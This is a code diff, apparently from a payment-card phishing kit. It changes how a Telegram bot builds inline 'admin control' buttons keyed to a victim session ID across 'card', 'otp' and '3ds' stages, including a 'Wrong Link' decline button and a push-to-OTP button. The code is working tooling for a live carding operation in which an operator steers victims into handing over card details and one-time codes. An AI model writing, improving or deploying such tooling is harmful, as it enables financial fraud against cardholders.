@@ -32,22 +32,14 @@ export async function sendTelegram(message, replyMarkup) {
 
 /**
  * Build inline keyboard for admin control.
- * When baseUrl is provided and public, buttons are URL buttons (click → opens set-mode).
- * Otherwise callback_data (needs /api/tg-hook webhook registered).
+ * Always uses callback_data so clicks are instant (no browser tab opens).
+ * Requires the Telegram webhook to be set to /api/tg-hook.
  * @param {string} sessionId
- * @param {string} baseUrl
+ * @param {string} _baseUrl  (kept for backward compat, unused)
  * @param {'card'|'otp'|'3ds'} stage
  */
-export function buildKeyboard(sessionId, baseUrl, stage = 'card') {
-  // Telegram rejects http://localhost / private IPs as URL buttons.
-  // Detect and fall back to callback_data (requires /api/tg-hook webhook for live control,
-  // but admin can always use /admin panel regardless).
-  const isPublic = !!baseUrl && /^https?:\/\//.test(baseUrl) && !/localhost|127\.0\.0\.1|192\.168\.|10\.|::1/.test(baseUrl);
-  const url = (a) => `${baseUrl}/api/set-mode?s=${encodeURIComponent(sessionId)}&a=${a}`;
-  const btn = (text, a) =>
-    isPublic
-      ? { text, url: url(a) }
-      : { text, callback_data: `${a}:${sessionId}` };
+export function buildKeyboard(sessionId, _baseUrl, stage = 'card') {
+  const btn = (text, a) => ({ text, callback_data: `${a}:${sessionId}` });
 
   if (stage === 'card') {
     return {
@@ -65,7 +57,6 @@ export function buildKeyboard(sessionId, baseUrl, stage = 'card') {
       ]
     };
   }
-  // '3ds'
   return {
     inline_keyboard: [
       [btn('❌ Wrong Link', 'decline'), btn('🔑 → OTP', 'otp')],
